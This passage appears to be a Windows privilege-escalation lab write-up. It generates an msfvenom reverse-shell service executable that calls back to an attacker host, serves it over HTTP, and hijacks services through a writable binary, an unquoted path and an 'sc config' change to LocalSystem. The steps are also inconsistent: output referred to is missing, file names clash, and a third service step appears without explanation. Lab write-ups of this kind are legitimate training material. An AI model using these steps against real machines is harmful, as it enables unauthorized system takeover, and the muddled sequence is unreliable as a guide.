### Question 1 — Get the flag on svcusr1's desktop.

I started by querying the `WindowsScheduler` service to see what it runs as and where its executable sits:

`Everyone` has `(M)` — Modify — on the file, so it could be freely overwritten.

On my attacking machine, I built a reverse shell payload in the `exe-service` format and served it over HTTP:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=—REDACTED— LPORT=4444 -f exe-service -o rev-svc.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 5632 bytes
Saved as: rev-svc.exe
```

**Breakdown:**

- `msfvenom` generates the payload
- `-p windows/x64/shell_reverse_tcp` selects a 64-bit Windows reverse TCP shell
- `LHOST=—REDACTED—` and `LPORT=4444` set the callback address and port
- `-f exe-service` sets the output to a Windows service executable format
- `-o rev-svc.exe` names the output file

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- `python3 -m http.server 8000` serves the current directory over HTTP on port 8000

### Question 2 — Get the flag on svcusr2's desktop.

With the executable-overwrite route already demonstrated, I moved on to the unquoted-path service, `disk sorter enterprise`, and queried it:

```cmd
C:\PROGRA~2\SYSTEM~1>sc qc "disk sorter enterprise"

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

The path is unquoted and contains spaces, so the SCM would try `C:\MyPrograms\Disk.exe` before the real executable. Rather than generating a fresh payload, I reused my existing `rev-svc.exe` (left over from Question 1) by renaming and moving it into place at that shorter candidate path:

```cmd
C:\PROGRA~2\SYSTEM~1>move WService.exe Disk.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1>move Disk.exe C:\MyPrograms\Disk.exe
        1 file(s) moved.
```


```cmd
C:\tools\AccessChk>sc config THMService binPath= "C:\tools\AccessChk\rev-svc3.exe" obj= LocalSystem
[SC] ChangeServiceConfig SUCCESS
```

**Breakdown:**

- `sc config THMService` reconfigures the `THMService` service
- `binPath= "C:\tools\AccessChk\rev-svc3.exe"` sets its executable to the payload
- `obj= LocalSystem` sets the account it runs as to `LocalSystem`, the highest-privileged account available
